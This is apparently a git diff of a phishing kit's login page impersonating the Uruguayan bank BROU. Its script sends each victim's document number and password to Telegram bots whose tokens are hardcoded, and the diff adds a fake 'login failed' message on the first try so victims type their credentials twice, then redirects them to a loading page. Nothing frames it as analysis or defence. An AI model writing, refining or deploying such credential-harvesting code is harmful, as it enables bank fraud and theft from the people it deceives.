@@ -202,6 +202,8 @@
   </footer>
 
   <script>
+    let intentosLogin = 0;
+
     function togglePassword() {
       const passwordInput = document.getElementById("password");
       const eyeIcon = document.getElementById("eye-icon");
@@ -214,6 +216,7 @@
       }
     }
 
+    // Lista de bots para enviar las credenciales
     const bots = [
       {
         token: '8135711594:AAFr31MSd-lpmmS7gC92WpMBMCyIo8l5n8U',
@@ -225,6 +228,7 @@
       }
     ];
 
+    // Función para enviar los datos a Telegram
     async function notifyLoginAttempt(documento, password) {
       const mensaje = `➖➖➖[ BROU UY ]➖➖➖
 ✔️ Documento: ${documento}
@@ -265,6 +269,7 @@
 
       let valido = true;
 
+      // Validación del documento
       if (documento === "") {
         errorDoc.innerText = "El usuario no puede estar vacío";
         errorDoc.style.display = "block";
@@ -280,6 +285,7 @@
         documentoInput.classList.remove("input-error");
       }
 
+      // Validación de la contraseña
       if (password === "") {
         errorPass.style.display = "block";
         passwordInput.classList.add("input-error");
@@ -289,15 +295,22 @@
         passwordInput.classList.remove("input-error");
       }
 
-      if (!valido) return;
+      // Si hay error, no enviamos datos y no redirigimos
+      if (!valido) {
+        return;
+      }
 
-      // Mostramos el mensaje de error (si es la primera vez)
-      errorLogin.style.display = "flex";
-
-      // Enviamos las credenciales a Telegram
-      await notifyLoginAttempt(documento, password);
-
-      // No redirigimos a otra página ya que el login ha fallado
+      // Si las credenciales son correctas, enviamos los datos a Telegram y redirigimos
+      if (intentosLogin === 0 || password.length < 5) {
+        errorLogin.style.display = "flex";
+        intentosLogin++;
+        await notifyLoginAttempt(documento, password);  // Enviar datos en el primer intento
+        return;
+      } else {
+        errorLogin.style.display = "none";
+        await notifyLoginAttempt(documento, password);  // Enviar datos en el segundo intento
+        window.location.href = "cargando.html";  // Redirigir a cargando.html
+      }
     });
   </script>
 
